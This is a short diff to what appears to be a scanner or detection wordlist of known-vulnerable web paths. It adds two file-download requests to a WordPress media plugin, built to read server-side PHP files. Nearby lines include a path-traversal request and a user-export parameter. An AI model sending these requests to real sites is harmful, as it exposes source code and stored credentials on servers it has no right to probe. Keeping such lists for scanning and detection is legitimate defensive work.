@@ -85,3 +85,5 @@
 /ui_base/js/..%2f..%2f..%2f..%2fsettings.js
 /SearchSvc/CVSearchService.svc
 /wp-admin/index.php?download-lp-users=yes
+/wp-content/plugins/media-library-assistant/includes/mla-file-downloader.php?mla_download_type=text/html&mla_download_file=/var/www/html/wordpress/wp-content/index.php
+/wp-content/plugins/media-library-assistant/includes/mla-file-downloader.php?mla_download_type=text/html&mla_download_file=/var/www/html/wp-content/index.php
